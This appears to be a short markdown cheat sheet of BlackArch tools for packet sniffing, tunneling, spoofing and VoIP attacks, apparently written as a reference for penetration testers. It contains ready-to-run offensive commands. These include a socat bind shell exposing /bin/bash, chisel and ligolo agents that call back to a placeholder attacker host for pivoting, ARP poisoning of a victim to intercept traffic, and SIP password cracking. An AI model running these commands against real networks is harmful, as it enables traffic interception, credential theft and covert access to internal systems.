# Networking / Tunneling / Sniffing / VoIP

**Groups:** `blackarch-networking` · `blackarch-sniffer` · `blackarch-spoof` · `blackarch-tunnel` · `blackarch-voip`

---

## Key Tools

| Tool | What it does | Quick start |
|------|-------------|-------------|
| `wireshark` | Packet capture & analysis GUI | `wireshark` |
| `tshark` | CLI Wireshark | `tshark -i eth0 -f 'port 80'` |
| `tcpdump` | Packet capture | `tcpdump -i eth0 -w capture.pcap` |
| `netcat` / `ncat` | TCP/UDP swiss army knife | `nc -lvnp 4444` |
| `socat` | Multi-purpose relay | `socat TCP-LISTEN:4444,fork EXEC:/bin/bash` |
| `bettercap` | MITM framework | `bettercap -iface eth0` |
| `arpspoof` | ARP poisoning | `arpspoof -i eth0 -t <victim> <gateway>` |
| `ettercap` | MITM + sniffing suite | `ettercap -G` (GUI) |
| `yersinia` | Layer 2 attacks (STP, CDP, DHCP) | `yersinia -G` |
| `scapy` | Packet crafting/manipulation | `python3 -c 'from scapy.all import *'` |
| `proxychains` | Route traffic through proxies | `proxychains nmap -sT <ip>` |
| `chisel` | TCP/UDP tunnel over HTTP | `chisel server -p 8080 --reverse` |
| `ligolo-ng` | Tunneling agent for pivoting | `ligolo-ng -connect <server>:11601` |
| `iodine` | DNS tunneling | `iodined -f 10.0.0.1 tunnel.example.com` |
| `sshuttle` | VPN-over-SSH | `sshuttle -r user@host 192.168.0.0/24` |
| `svcrack` | VoIP password cracker | `svcrack -u 100 -d wordlist.txt <ip>` |
| `sipvicious` | SIP scanner & cracker | `svmap <ip>` |

## Pivoting / Tunneling Cheatsheet

```bash
# Port forward via SSH
ssh -L 8080:internal-host:80 user@jumpbox

# Dynamic SOCKS proxy
ssh -D 1080 user@jumpbox
proxychains curl http://internal-host/

# Chisel (HTTP tunnel)
# server (attacker):
chisel server -p 8080 --reverse
# client (target):
chisel client <attacker_ip>:8080 R:1080:socks

# Ligolo-ng
# server: ./proxy -selfcert
# client: ./agent -connect <attacker>:11601 -ignore-cert
```

## ARP Poisoning / MITM

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i eth0 -t <victim_ip> <gateway_ip>
arpspoof -i eth0 -t <gateway_ip> <victim_ip>
# then capture with wireshark / tshark
```
